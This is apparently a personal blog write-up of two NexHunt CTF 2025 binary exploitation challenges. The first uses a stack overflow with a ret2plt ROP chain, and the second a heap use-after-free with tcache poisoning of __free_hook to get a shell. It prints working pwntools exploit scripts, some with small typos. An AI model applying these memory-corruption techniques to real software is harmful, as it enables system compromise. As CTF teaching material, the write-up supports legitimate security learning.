---
layout: post
title: NexHunt CTF 2025
description:
date: 2025-12-14
categories:
  - writeup
  - pwn
tags:
---
I was looking for some CTFs to play during the weekend then I saw that  [NexHunt CTF](https://ctftime.org/event/3037) had a few hours left so I joined the CTF with about 3 hours left until the CTF ends. I was only able to solve 2 pwn challenges during those hours.
## Archive Keeper

![Archive Keeper](/assets/images/writeups/nexhunt/archive_keeper/archive.png)

### About The binary


```sh
 rabin2 -I ./chall
arch     x86
baddr    0x400000
binsz    14182
bintype  elf
bits     64
canary   false
injprot  false
class    ELF64
compiler GCC: (Debian 14.2.0-19) 14.2.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
nx       true
os       linux
pic      false
relocs   true
relro    partial
rpath    NONE
sanitize false
static   false
stripped false
subsys   linux
va       true
```

IT is a x86 64 bit elf binary and only the `NX` security mitgation is enabled.

### Reversing and Vulnerability Discovery

This is a simple binary and the only interesting function is `vuln()` .


```c
ssize_t vuln() {
    puts("Welcome to the Archive. Enter yo…");
    void buf;
    return read(0, &buf, 0xc8);
}
```

There is a stack buffer overflow in the function.

### Exploitation

The first step would be to find the padding to the return address.

I found that the padding from the buffer to the return address is `72`

**Exploitation Strategy**

Since NX is enabled, ROP must be used to bypass it. 
A two-stage ROP attack (`ret2plt`): 

1. Stage 1: Libc Leak - Overwrite return address with ROP chain that leaks a libc address. This can be done by calling a function like `puts()` with a GOT entry. The ROP chain should then return to the main function to allow for the second exploit.

2. Stage 2: Pop a shell - Use leaked libc to calculate address of `system()` and the string `/bin/sh`. Overwrite the return address with ROP chain that calls `system("/bin/sh")`, granting a shell.

#### Stage 1 : Libc Address Leak

```python
payload_stage1 = flat(
	cyclic(72), # padding
	rop.rdi.addresss, # pop rdi, ret gadget
	elf.got.puts, # puts@got
	elf.plt.puts, # puts@plt
	elf.sym.main, # return to main for stage 2
)
```

This payload will leak the address of `puts@GOT` and we can use that to get the libc base address

```python
libc.address = leak - libc.sym.puts
```

Now we can use that to find the address of `system()` and `/bin/sh`
#### Stage 2 : Popping a shell


```python 
payload_stage2 = flat(
	cyclic(72), # padding
	rop.ret.address, # for 16 bytes alignment
	rop.rdi.address, # 
	next(libc.search(b"/bin/sh")), # addr of /bin/sh
	libc.sym.system, # system()
)
```

This ROP chain executes `system("/bin/sh")`, which spawns a shell.

![Archive Keeper](/assets/images/writeups/nexhunt/archive_keeper/shell.png)

The full exploit : 

```python
def exploit():
	##################################################################### 
	######################## EXPLOIT CODE ###############################
	#####################################################################
	
	pop_rdi = rop.rdi.address
	offset = 64 + 8 # padding
	payload_stage2 = flat(
		cyclic(offset),
		pop_rdi, elf.got.puts,
		elf.plt.puts,
		elf.sym.main
	)

	sla(b"Enter your data:\n", payload_stage1)
	data = rl() # recv leak
	data = data.rstrip(b"\r\n")
	leak = u64(data.ljust(8, b"\x00"))
	print_leak("puts", leak)
	libc.address = leak - libc.sym.puts
	print_leak("libc base", libc.address)

	payload_stage2 = flat(
		cyclic(offset),
		rop.ret.address,
		pop_rdi, next(libc.search(b"/bin/sh")),
		libc.sym.system
	)

	sla(b"Enter your data:\n", payload_stage2)

```

[FULL EXPLOIT](https://github.com/t1b4n3/ctf-writeups/blob/main/nexhunt/archive_keeper/xpl.py)

##  Ghost Note

![Archive Keeper](/assets/images/writeups/nexhunt/ghost_note/ghostnote.png)

### About the binary

```sh
 rabin2 -I ./chall
arch     x86
baddr    0x0
binsz    15529
bintype  elf
bits     64
canary   true
injprot  false
class    ELF64
compiler GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
nx       true
os       linux
pic      true
relocs   true
relro    full
rpath    NONE
sanitize false
static   false
stripped false
subsys   linux
va       true
```

A x86-64 binary with all mitigations turned on.

```sh
./ld-linux-x86-64.so.2 ./libc.so.6 
GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.17) stable release version 2.31.
Copyright (C) 2020 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 9.4.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
```

This challenge uses `GLIBC 2.31`.

When we run the binary it show us a menu.

```./chall
1. Add Note
2. Delete Note
3. Show Note
4. Edit Note
5. Exit
>
```

### Reversing and Vulnerability Discovering

Lets take a look at the main function


```c
int32_t main(int32_t argc, char** argv, char** envp) {
    void* fsbase;
    int64_t var_10 = *(uint64_t*)((char*)fsbase + 0x28);
    setup();
    while (true) {
        menu();
        switch (get_int())
        {
            case 1: { add_note(); continue; }
            case 2: { delete_note(); continue; }
            case 3: { show_note(); continue; }
            case 4: { edit_note(); continue; }
            case 5:{  break; break;}
        }   
        puts("Invalid");
    }
    exit(0);
    /* no return */
}
```

`main()` shows use the menu prompt. we can just move on to the first option `add_note()`.

```c
int64_t add_note() {
    void* fsbase;
    int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
    printf("Index (0-%d): ", 9);
    int32_t index = get_int();
    if (index < 0 || index > 9)
        puts("Invalid index.");
    else if (!*(uint64_t*)(((int64_t)index << 3) + &notes))
    {
        printf("Size: ");
        int32_t size = get_int();
	
        if (size <= 0 || size > 0x1000)
            puts("Invalid size.");
        else
        {
            *(uint64_t*)(((int64_t)index << 3) + &notes) = malloc((int64_t)size);
            *(uint32_t*)(((int64_t)index << 2) + &note_sizes) = size;
            printf("Content: ");
            read(0, *(uint64_t*)(((int64_t)index << 3) + &notes), (int64_t)(size - 1));
            puts("Note added.");
        }
    }
    else
        puts("Note already exists.");
    
    int64_t result = rax ^ *(uint64_t*)((char*)fsbase + 0x28);
    
    if (!result)
        return result;
    
    __stack_chk_fail();
    /* no return */
}
```

This function just asks for a index which should not be used, size between `0 and 0x1000` to allocate a chunk and data. 

`delete_note()`

```c
int64_t delete_note() {
    void* fsbase;
    int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
    printf("Index: ");
    int32_t index = get_int();
    
    if (index < 0 || index > 9 || !*(uint64_t*)(((int64_t)index << 3) + &notes))
        puts("Invalid index or empty.");
    else
    {
        free(*(uint64_t*)(((int64_t)index << 3) + &notes));
        puts("Note deleted.");
    }
    
    int64_t result = rax ^ *(uint64_t*)((char*)fsbase + 0x28);
    
    if (!result)
        return result;
    
    __stack_chk_fail();
    /* no return */
}

```

This function asks for  a index and then it frees the chunk but is does not clear out the function pointer, therefore the is a `use-after-free` vulnerability here.

`show_note()`

```c
int64_t show_note()
{
    void* fsbase;
    int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
    printf("Index: ");
    int32_t index = get_int();
    
    if (index < 0 || index > 9 || !*(uint64_t*)(((int64_t)index << 3) + &notes))
        puts("Invalid index or empty.");
    else
    {
        printf("Data: ");
        write(1, *(uint64_t*)(((int64_t)index << 3) + &notes), 
            (int64_t)*(uint32_t*)(((int64_t)index << 2) + &note_sizes));
        puts(&data_402097);
    }
    
    int64_t result = rax ^ *(uint64_t*)((char*)fsbase + 0x28);
    
    if (!result)
        return result;
    
    __stack_chk_fail();
    /* no return */
}
```

As the function name says it just prints out the contents of the chunk.

`edit_note()`

```c
int64_t edit_note()
{
    void* fsbase;
    int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
    printf("Index: ");
    int32_t index = get_int();
    
    if (index < 0 || index > 9 || !*(uint64_t*)(((int64_t)index << 3) + &notes))
        puts("Invalid index or empty.");
    else
    {
        printf("New Content: ");
        read(0, *(uint64_t*)(((int64_t)index << 3) + &notes), 
            (int64_t)*(uint32_t*)(((int64_t)index << 2) + &note_sizes));
        puts("Note updated.");
    }
    
    int64_t result = rax ^ *(uint64_t*)((char*)fsbase + 0x28);
    
    if (!result)
        return result;
    
    __stack_chk_fail();
    /* no return */
}
```

This function Overwrites the contents of an existing note.


### Exploitation

**Strategy**: The goal is to gain arbitrary code execution.

1. Stage 1: Libc leak
	- Use the unsorted bin attack to leak a libc address and then calculate the base address.
2. Stage 2: Tcache poisoning and hook hijacking.
	- Use the tcache poisoning technique to hijack the `__free_hook` and get code execution. 


I create a template class to help make it easier to write the exploit

```python

def print_leak(description, addr):
	log.info(f"{description} @ {addr}")

class GhostNote:
	def __init__(self):
		pass

	def menu(self, choice):
		sla(b"> ", str(choice).encode())

	def send_index(self, index):
		sla(b"Index: ", str(index).encode())

	def add_note(self, index:int, size:int, note:bytes):
		self.menu(1)
		log.info(f"Adding Note | index {index} | {note[:8]}")
		sla(b"(0-9): ", str(index).encode())
		sla(b"Size: ", str(size).encode())
		sla(b"Content: ", note)
		rl()

	def delete_note(self, index):
		log.info(f"Delete Note | index {index}")
		self.menu(2)
		self.send_index(index)
		rl()

	def edit_note(self, index, note):
		log.info(f"Edit Note | index {index} | {note[:8]}")
		self.menu(4)
		self.send_index(index)
		sa(b"New Content: ", note)
		#ru(b"New Content: ")
		#s(note)

	def show_note(self, index):
		log.failure(f"Show Note | index {index}")
		self.menu(3)
		sla(b"Index: ", str(index).encode())
		ru(b"Data: ")
		data = rl().rstrip(b"\r\n")
		try: 
			data = data[:8]
			leak = u64(data.ljust(8, b"\x00"))
			print_leak("Leak", leak)
			return leak
		except:
			log.info(f"Data: {data}")
			return 0
```

`gn` is the object of the this class

#### Stage 1: Libc Address Leak


Allocate the chunks.

```python
gn.add_note(8, 0x600, b"A"0xf) # large size so it goes to unsorted bin
gn.add_note(9, 0x10, b"/bin/sh\x00") # to prevent consoliddation | will be used later on again
 
leak = gn.show_note(8) # this will leak the libc address

```

Trigger the unsorted bin: free the large chunk

```python
gn.delete_note(8)# it goes to unsorted bin
```

Leak the address

```python
leak = gn.show_note(8) # this will leak the libc address
```

Calculate the libc base address

```python
libc.address = leak - 0x1ecbe0
```


#### Stage 2: Tcache Poisoning and Hook Hijacking

Allocate and free two small chunks of the same size

```python
gn.add_note(0, 0x60, b"X"*0x48)
gn.add_note(1, 0x60, b"Y"*0x48)

gn.delete_note(0)
gn.delete_note(1)
```

Use the `UAF` to corrupt the `next/fd` pointer on the second freed chunks. Set it to `__free_hook`

```python
gn.edit_note(1, p64(libc.sym.__free_hook))
```

Allocate to new chunks of the same size as the one that are free. The first chunk returns a chunk from the tcache and the second one returns the `__free_hook`. Overwrite the `__free_hook` chunk with the address of the `system()`

```python
gn.add_note(2, 0x60, b"B"*0x48)
gn.add_note(3, 0x60, p64(libc.sym.system))
```

Trigger shell. Free the chunk that contains the string `/bin/sh`. Remember that the guard chunk we allocated ealier contains that string.

```python
gn.delete_note(9)
```

That pops a shell

![Shell](/assets/images/writeups/nexhunt/ghost_note/shell.png)

The full exploit

```python
class GhostNote:
	def __init__(self):
		pass

	def menu(self, choice):
		sla(b"> ", str(choice).encode())

	def send_index(self, index):
		sla(b"Index: ", str(index).encode())

	def add_note(self, index:int, size:int, note:bytes):
		self.menu(1)
		log.info(f"Adding Note | index {index} | {note[:8]}")
		sla(b"(0-9): ", str(index).encode())
		sla(b"Size: ", str(size).encode())
		sla(b"Content: ", note)
		rl()

	def delete_note(self, index):
		log.info(f"Delete Note | index {index}")
		self.menu(2)
		self.send_index(index)
		rl()

	def edit_note(self, index, note):
		log.info(f"Edit Note | index {index} | {note[:8]}")
		self.menu(4)
		self.send_index(index)
		sa(b"New Content: ", note)
		#ru(b"New Content: ")
		#s(note)

	def show_note(self, index):
		log.failure(f"Show Note | index {index}")
		self.menu(3)
		#self.send_index(3)
		sla(b"Index: ", str(index).encode())
		ru(b"Data: ")
		data = rl().rstrip(b"\r\n")
		#print(data[:8])
		try: 
			data = data[:8]
			leak = u64(data.ljust(8, b"\x00"))
			print_leak("Leak", leak)
			return leak
		except:
			log.info(f"Data: {data}")
			return 0
			
def exploit():
	##################################################################### 
	######################## EXPLOIT CODE ###############################
	#####################################################################
	gn = GhostNote()

	# leak | find libc base
	gn.add_note(8, 0x600, b"A"*0xf)
	gn.add_note(9, 0x10, b"/bin/sh\x00")
	gn.delete_note(8)
	leak = gn.show_note(8)
	libc.address = leak - 0x1ecbe0
	one_gadget = 0xe3afe
	print_leak("libc base", libc.address)
	print_leak("__free_hook", libc.sym.__free_hook)
	
	gn.add_note(0, 0x60, b"X"*0x48)
	gn.add_note(1, 0x60, b"Y"*0x48)

	gn.delete_note(0)
	gn.delete_note(1)

	gn.edit_note(1, p64(libc.sym.__free_hook))
	gn.add_note(2, 0x60, b"B"*0x48) # same as 1
	gn.add_note(3, 0x60, p64(libc.sym.system))
	
	gn.delete_note(9)
```


[FULL EXPLOIT](https://github.com/t1b4n3/ctf-writeups/blob/main/nexhunt/ghostnote/xpl.py)
